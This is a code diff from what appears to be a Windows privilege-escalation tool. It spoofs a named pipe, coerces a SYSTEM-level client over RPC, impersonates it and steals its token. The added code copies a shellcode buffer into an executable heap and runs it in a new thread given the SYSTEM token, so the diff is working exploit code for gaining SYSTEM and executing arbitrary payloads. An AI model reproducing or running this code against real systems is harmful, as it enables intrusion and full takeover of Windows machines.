@@ -72,7 +72,9 @@ void StartNamedPipeAndGetSystem()
 	SECURITY_DESCRIPTOR sd = { 0 };
 	SECURITY_ATTRIBUTES sa = { 0 };
 	DWORD buffer_size = 0;
-	HANDLE hToken = INVALID_HANDLE_VALUE;
+	HANDLE hDuplicateToken = INVALID_HANDLE_VALUE;
+	WCHAR szUser[256];
+	DWORD dwSize = 265;
 
 	pwszPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
 	StringCchPrintf(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\random\\pipe\\srvsvc");
@@ -97,16 +99,30 @@ void StartNamedPipeAndGetSystem()
 			if (ConnectNamedPipe(hPipe, NULL) > 0) {
 				wprintf(L"[+] A client connected!\n");
 				if (ImpersonateNamedPipeClient(hPipe)) {
-					WCHAR szUser[256];
-					DWORD dwSize = 265;
+					
 					GetUserName(szUser, &dwSize);
 					wprintf(L"[+] Impersonating dummy :) : %s\n\n\n\n", szUser);
+					OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken);
 					if (g_ShellcodeBuffer != NULL && g_dwShellcodeSize != 0) {
-						ExecuteShellCode(g_ShellcodeBuffer, g_dwShellcodeSize);
+						if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
+							wprintf(L"[-] DuplicateToken Error %d \n", GetLastError());
+							CloseHandle(hPipe);
+							continue;
+						}
+						HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
+						
+						PVOID Mptr = HeapAlloc(hHep, 0, g_dwShellcodeSize);
+						
+						RtlCopyMemory(Mptr, g_ShellcodeBuffer, g_dwShellcodeSize);
+						DWORD dwThreadId = 0;
+						HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, CREATE_SUSPENDED, &dwThreadId);
+						
+						SetThreadToken(&hThread, hSystemToken);
+						
+						ResumeThread(hThread);
+
 					}
-					if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken)) {
-						CloseHandle(hPipe);
-					}
+					CloseHandle(hPipe);
 				}
 				else {
 					wprintf(L"[-] CreateNamedPipe error\n");
@@ -119,13 +135,11 @@ void StartNamedPipeAndGetSystem()
 	}
 }
 
-void ExecuteCommand(PWCHAR Command)
+void Execute()
 {
 	RPC_STATUS status;
 	RPC_WSTR pszStringBinding;
 	RPC_BINDING_HANDLE BindingHandle;
-
-	g_pwszCommandLine = Command;
 
 	status = RpcStringBindingCompose(
 		NULL,
@@ -169,7 +183,7 @@ void ExecuteCommand(PWCHAR Command)
 		wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
 	}RpcEndExcept
 	Sleep(1000);
-	GetSystemAsImpersonatedUser(hSystemToken);
+	// GetSystemAsImpersonatedUser(hSystemToken);
 }
 
 
